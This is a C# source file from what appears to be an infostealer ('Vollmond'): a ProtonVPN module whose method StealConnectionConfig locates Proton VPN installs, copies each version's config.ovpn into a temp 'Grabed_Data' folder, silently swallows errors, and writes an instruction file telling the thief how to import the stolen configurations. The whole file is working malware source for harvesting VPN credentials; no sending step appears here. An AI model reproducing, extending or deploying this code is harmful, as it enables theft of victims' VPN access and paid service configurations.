namespace Vollmond.VPN
{
    internal class ProtonVPN
    {
        public static void StealConnectionConfig()
        {
            try
            {
                string ProtonPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Proton", "VPN");

                if (Directory.Exists(ProtonPath))
                {
                    string path = Path.Combine(Path.GetTempPath(), "Grabed_Data", "VPN", "Proton VPN");
                    Directory.CreateDirectory(path);
                    var versionDirs = GetVersions(ProtonPath);

                    foreach (string versionDir in versionDirs)
                    {
                        string versionName = new DirectoryInfo(versionDir).Name;
                        File.Copy(Path.Combine(versionDir, "Resources", "config.ovpn"),
                                  Path.Combine(path, $"config{versionName.Replace('v', 'V')}.ovpn")); // Replace for better readable
                    }

                    string instruction =
                        """
                    ## How to use config.ovpn?

                    * What is is?
                    * It's a universal config file for connection to server in any vpn client

                    > This file can contain both configurations for connecting to free servers and premium ones :information_source:

                    __Well, in all (i think so..) vpn clients you can find button **`Import configuration`** or something like this.
                    Simple import that file, and connecting to servers what contains in this file.__

                    * **It's that simple, yet?**
                    
                    """;

                    File.WriteAllText(Path.Combine(path, "INSTRUCTION.md"), instruction);
                }
            }
            catch { }
        }

        private static List<string>? GetVersions(string ProtonPath)
        {
            List<string> versionDirs = new List<string>();
            try
            {
                string[] directories = Directory.GetDirectories(ProtonPath);

                foreach (string dir in directories)
                {
                    if (Path.GetFileName(dir).StartsWith("v"))
                    {
                        versionDirs.Add(dir);
                    }
                }
                return versionDirs;
            }
            catch { }
            return versionDirs;
        }
    }
}
